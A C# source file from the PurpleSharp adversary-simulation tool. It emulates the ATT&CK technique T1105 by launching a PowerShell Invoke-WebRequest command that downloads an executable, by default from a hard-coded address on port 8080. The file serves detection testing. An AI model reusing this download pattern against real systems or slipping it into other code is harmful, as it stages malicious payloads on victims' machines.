using System;
using System.Threading;
using PurpleSharp.Lib;

namespace PurpleSharp.Simulations
{
    public class CommandControl
    {
        public static void PowerShellDownload(PlaybookTask playbookTask, string log)
        {
            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
            Lib.Logger logger = new Lib.Logger(currentPath + log);
            logger.SimulationHeader("T1105");
            logger.TimestampInfo("Using the command line to execute the technique");
            if (playbookTask.url == null)
            {
                playbookTask.url = "http://100.1.1.169:8080/exe.exe";
            }
            try
            {
                string fileName = System.IO.Path.GetFileName(new Uri(playbookTask.url).LocalPath);
                string command = string.Format("Invoke-WebRequest -Uri \"{0}\" -OutFile \".\\{1}\"", playbookTask.url, fileName);
                ExecutionHelper.StartProcessApi("", $"powershell.exe {command}", logger);
                if (playbookTask.task_sleep > 0)
                {   
                    logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbookTask.task_sleep));
                    Thread.Sleep(1000* playbookTask.task_sleep);
                }
                logger.SimulationFinished();
            }
            catch(Exception ex)
            {
                logger.SimulationFailed(ex);
            }
        }
    }
}